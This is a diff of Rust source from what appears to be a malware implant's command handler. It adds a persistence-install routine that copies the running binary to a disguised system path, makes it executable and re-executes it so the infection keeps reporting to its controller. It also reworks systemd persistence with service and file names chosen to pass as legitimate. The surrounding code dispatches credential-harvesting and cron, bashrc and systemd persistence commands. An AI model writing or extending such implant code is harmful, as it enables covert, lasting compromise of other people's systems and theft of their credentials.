@@ -62,6 +62,7 @@ impl CommandAction {
             ("creds", "harvest")=> self.cmd_creds(config),
             ("creds", _)        => self.cmd_creds(config),
             // ── Persistence ────────────────────────────────────────
+            ("persist", "install") => self.cmd_persist_install(config),
             ("persist", "cron")    => self.cmd_persist_cron(config),
             ("persist", "systemd") => self.cmd_persist_systemd(config),
             ("persist", "bashrc")  => self.cmd_persist_bashrc(config),
@@ -232,6 +233,46 @@ impl CommandAction {
 
     // ── Persistence ───────────────────────────────────────────────
 
+    /// Copy the running implant to the install path and re-exec there.
+    ///
+    /// Single decision point for where the binary lives on disk. Copies
+    /// /proc/self/exe to the install path (default config.implant_path,
+    /// overridable via `persist install <path>`), chmods it 0755, then spawns a
+    /// child running from that path. The beacon loop sees `reexec` in the
+    /// result, sends it, and exits the parent — so only the relocated child
+    /// beacons under the SAME implant_id (hostname+MAC), and the server merges
+    /// it into the existing session instead of creating a second one. cron/
+    /// bashrc/systemd then reference config.implant_path (where this put it).
+    fn cmd_persist_install(&self, config: &Config) -> io::Result<serde_json::Value> {
+        let path = match self.args.get("path").and_then(|v| v.as_str()) {
+            Some(s) if !s.is_empty() => s.to_string(),
+            _ => config.implant_path.clone(),
+        };
+        let our_binary = std::fs::read("/proc/self/exe")?;
+        if let Some(parent) = std::path::Path::new(&path).parent() {
+            let _ = std::fs::create_dir_all(parent);
+        }
+        std::fs::write(&path, &our_binary)?;
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;
+
+        // Spawn a child from the install path; the parent sends its result then
+        // exits (mirrors privesc pkexec). Same implant_id → server merges it.
+        let child = ShellCommand::new(&path)
+            .stdin(std::process::Stdio::null())
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn()?;
+
+        Ok(serde_json::json!({
+            "installed": true,
+            "path": path,
+            "pid": child.id(),
+            "reexec": true,
+            "note": "relocated + restarted from install path; session continues under same id",
+        }))
+    }
+
     /// Write a @reboot cron job only.
     fn cmd_persist_cron(&self, config: &Config) -> io::Result<serde_json::Value> {
         let implant_path = config.implant_path.clone();
@@ -250,21 +291,14 @@ impl CommandAction {
         let service_name = self.args.get("service_name")
             .and_then(|v| v.as_str())
             .unwrap_or("systemd-logind-helper");
-        let implant_path = self.args.get("implant_path")
-            .and_then(|v| v.as_str())
-            .unwrap_or("/usr/bin/dbus-runner");
+        // Use the baked per-tier implant_path (config.implant_path) so systemd persistence
+        // lands at the SAME on-disk path as cron/bashrc persistence (which read config too),
+        // instead of the /usr/bin/dbus-runner fallback — the per-tier mask (e.g.
+        // /usr/bin/update-checker) must be consistent across all persist methods.
+        let implant_path = config.implant_path.clone();
 
-        // Copy self to implant path
-        let our_binary = std::fs::read("/proc/self/exe").unwrap_or_default();
-        if !our_binary.is_empty() {
-            if let Some(parent) = std::path::Path::new(implant_path).parent() {
-                let _ = std::fs::create_dir_all(parent);
-            }
-            std::fs::write(implant_path, &our_binary)?;
-            use std::os::unix::fs::PermissionsExt;
-            let _ = std::fs::set_permissions(implant_path, std::fs::Permissions::from_mode(0o755));
-        }
-
+        // Unit-only: the binary is placed at implant_path by `persist install`;
+        // this writes the service unit pointing at it and enables + starts it.
         let unit_path = format!("/etc/systemd/system/{}.service", service_name);
         let unit = format!(
             "[Unit]\nDescription={}\nAfter=network.target\n\n\
